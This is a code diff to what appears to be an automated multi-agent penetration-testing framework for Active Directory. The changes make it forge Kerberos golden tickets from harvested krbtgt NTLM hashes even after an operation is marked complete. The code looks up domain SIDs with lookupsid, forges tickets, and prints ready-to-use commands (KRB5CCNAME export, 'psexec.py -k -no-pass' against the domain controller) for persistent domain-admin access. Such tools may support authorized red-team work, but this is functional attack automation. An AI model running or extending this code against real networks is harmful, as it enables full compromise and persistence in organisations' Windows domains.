@@ -422,6 +422,7 @@ async def _prime_operation(
         # Store target info so CLI can reconstruct state
         if target_ips:
             await state._backend.set_meta("target_ip", target_ips[0])
+            await state._backend.set_meta("target_ips", ",".join(target_ips))
         if target_domain:
             await state._backend.set_meta("target_domain", target_domain)
 
@@ -954,6 +955,11 @@ async def run_multi_agent_operation(
                     f"Path: {dispatcher.shared_state.domain_admin_path or 'unknown'}"
                 )
             logger.info("Operation marked complete; skipping post-run wait")
+            # Still wait for golden ticket if DA was achieved (same as _wait_for_completion does)
+            # This is critical: _wait_for_completion() calls _wait_for_golden_ticket(), but when
+            # the orchestrator marks the operation complete (no pending tasks), we skip it.
+            # We must still forge the golden ticket before exiting!
+            await _wait_for_golden_ticket(dispatcher)
             # Still wait for running crack tasks to complete
             await _wait_for_crack_tasks(dispatcher)
         else:
@@ -2941,15 +2947,27 @@ async def _auto_golden_ticket(
 
             state = dispatcher.shared_state
 
-            # Skip if operation is complete
-            if state.completed:
-                logger.debug("Operation complete, stopping auto golden ticket")
-                break
-
             # Get domains that already have golden tickets (from persisted state)
             processed_domains = {
                 t.get("domain", "").lower() for t in state.golden_tickets if t.get("domain")
             }
+
+            # Check for unprocessed krbtgt hashes BEFORE checking completed flag.
+            # This ensures we process any krbtgt hashes even if the orchestrator
+            # marked the operation complete while we were sleeping.
+            pending_krbtgt_domains = set()
+            for hash_obj in state.all_hashes:
+                if hash_obj.username.lower() == "krbtgt" and hash_obj.hash_type.lower() == "ntlm":
+                    domain = (hash_obj.domain or "").lower()
+                    if domain and domain not in processed_domains:
+                        pending_krbtgt_domains.add(domain)
+
+            # Only exit if operation is complete AND no unprocessed krbtgt hashes
+            if state.completed and not pending_krbtgt_domains:
+                logger.debug(
+                    "Operation complete and no pending krbtgt hashes, stopping auto golden ticket"
+                )
+                break
 
             # Look for krbtgt hashes we haven't processed yet
             for hash_obj in state.all_hashes:
@@ -3005,6 +3023,8 @@ async def _auto_golden_ticket(
                             "status": "failed_no_dc",
                         }
                     )
+                    # Update processed_domains to prevent duplicate attempts in this iteration
+                    processed_domains.add(domain.lower())
                     continue
 
                 # Run lookupsid to get domain SID
@@ -3032,6 +3052,8 @@ async def _auto_golden_ticket(
                                 "status": "failed_no_sid",
                             }
                         )
+                        # Update processed_domains to prevent duplicate attempts in this iteration
+                        processed_domains.add(domain.lower())
                         continue
 
                     domain_sid = sid_match.group(1)
@@ -3061,7 +3083,15 @@ async def _auto_golden_ticket(
                             f"→ Use: export KRB5CCNAME={ticket_path}\n"
                             f"→ Then: psexec.py -k -no-pass dc.{domain}"
                         )
-                        state.has_golden_ticket = True
+
+                        # Announce golden ticket - this sets has_golden_ticket, checkpoints,
+                        # and marks operation complete if stop_on_golden_ticket is enabled
+                        await dispatcher.announce_golden_ticket(
+                            domain=domain,
+                            krbtgt_hash=hash_obj.hash_value,
+                            ticket_path=ticket_path,
+                            source_agent="auto_golden_ticket",
+                        )
 
                         # Store ticket details in state (persisted to Redis!)
                         state.add_golden_ticket(
@@ -3074,20 +3104,35 @@ async def _auto_golden_ticket(
                                 "status": "success",
                             }
                         )
+                        # Update processed_domains to prevent duplicate attempts in this iteration
+                        processed_domains.add(domain.lower())
 
                         # Add to state timeline
                         from ares.core.models import TimelineEvent
 
-                        state.operation_timeline.append(
-                            TimelineEvent(
-                                id=f"golden-ticket-{domain.replace('.', '-')}",
-                                timestamp=datetime.now(timezone.utc),
-                                source="auto_golden_ticket",
-                                description=f"Golden ticket generated for {domain} Administrator",
-                                mitre_techniques=["T1558.001"],
-                                confidence=1.0,
-                            )
+                        timeline_event = TimelineEvent(
+                            id=f"golden-ticket-{domain.replace('.', '-')}",
+                            timestamp=datetime.now(timezone.utc),
+                            source="auto_golden_ticket",
+                            description=f"Golden ticket generated for {domain} Administrator",
+                            mitre_techniques=["T1558.001"],
+                            confidence=1.0,
                         )
+                        state.operation_timeline.append(timeline_event)
+
+                        # Persist timeline event to Redis
+                        backend = getattr(state, "_backend", None)
+                        if backend:
+                            event_dict = {
+                                "id": timeline_event.id,
+                                "timestamp": timeline_event.timestamp.isoformat(),
+                                "description": timeline_event.description,
+                                "evidence_ids": timeline_event.evidence_ids,
+                                "mitre_techniques": timeline_event.mitre_techniques,
+                                "confidence": timeline_event.confidence,
+                                "source": timeline_event.source,
+                            }
+                            await backend.add_timeline_event(event_dict)
                     else:
                         logger.warning(
                             f"🎫 Auto-golden-ticket: Failed to generate ticket for {domain}: {output}"
@@ -3101,6 +3146,8 @@ async def _auto_golden_ticket(
                                 "error": output[:500],
                             }
                         )
+                        # Update processed_domains to prevent duplicate attempts in this iteration
+                        processed_domains.add(domain.lower())
 
                 except Exception as e:
                     logger.warning(f"🎫 Auto-golden-ticket: Error generating ticket: {e}")
@@ -3113,6 +3160,8 @@ async def _auto_golden_ticket(
                             "error": str(e)[:500],
                         }
                     )
+                    # Update processed_domains to prevent duplicate attempts in this iteration
+                    processed_domains.add(domain.lower())
 
         except asyncio.CancelledError:
             break
@@ -3471,7 +3520,12 @@ async def _wait_for_completion(
 
         # Check for domain admin or explicit completion
         if dispatcher.shared_state.has_domain_admin:
-            logger.success("Domain Admin achieved! Operation complete.")
+            from ares.core.config import get_stop_on_golden_ticket
+
+            if get_stop_on_golden_ticket():
+                logger.success("Domain Admin achieved! Continuing to forge golden ticket...")
+            else:
+                logger.success("Domain Admin achieved! Operation complete.")
             # Wait for loot collection (share spider, etc.) while background tasks are still running
             await _wait_for_loot_collection(dispatcher)
             # Wait for golden ticket generation (if krbtgt hash is available)
